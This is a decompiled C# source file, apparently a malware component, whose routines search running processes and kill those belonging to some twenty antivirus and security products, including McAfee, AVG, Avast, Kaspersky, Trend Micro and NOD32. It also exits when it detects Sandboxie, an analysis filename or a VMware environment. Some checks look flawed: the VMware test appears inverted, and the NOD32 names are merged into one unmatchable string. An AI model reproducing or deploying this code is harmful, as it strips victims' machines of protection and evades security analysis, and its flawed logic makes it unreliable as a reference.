using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class Daanteys
{
	public static void Enable()
	{
		mofa();
		aag();
		aas();
		aav();
		aavg();
		abg();
		acav();
		ac();
		aen32();
		ae();
		afprot6();
		ak();
		ama();
		an();
		aos();
		aop();
		apc();
		asp();
		ass();
		ate();
		avp();
		aza();
	}

	public static void asb(Form frmSelect)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 82:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 5:
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0007:
					num = 2;
					if (!frmSelect.get_Text().Contains("#"))
					{
						goto end_IL_0000_3;
					}
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				frmSelect.Close();
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 82;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ama()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "mcagentmcuimgr", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aavg()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "avgemc", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aas()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "a2servic", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aav()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ashWebSv", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void acav()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "clamauto", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void ac()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "cpf", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void ae()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ewido", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void afprot6()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "FPAVServer", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void ak()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "kavsvc", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void abg()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "BullGuard", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aza()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "VSMON", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aag()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "antigen", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void an()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ccapp", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aos()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "tmlisten", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void apc()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "pccntmon", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void asp()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "earthagent", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void ass()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "spysweeper", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void avp()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "vpcmapvmsrvc", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aop()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "acs.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void aen32()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "nod32.exenod32krn.exeekrn.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	public static void mofa()
	{
		uHmixyIUKrMQgWOandboxie();
		IsVmWare();
		ate();
	}

	public static void uHmixyIUKrMQgWOandboxie()
	{
		if (Process.GetProcessesByName("SbieSvc").Length >= 1)
		{
			Environment.Exit(0);
		}
	}

	public static void IsVmWare()
	{
		string lpClassName = "VMDragDetectWndClass";
		string lpWindowName = null;
		long num = FindWindowA(ref lpClassName, ref lpWindowName);
		if (num == 0L)
		{
			Environment.Exit(0);
		}
	}

	private static void ate()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			Environment.Exit(0);
		}
	}
}
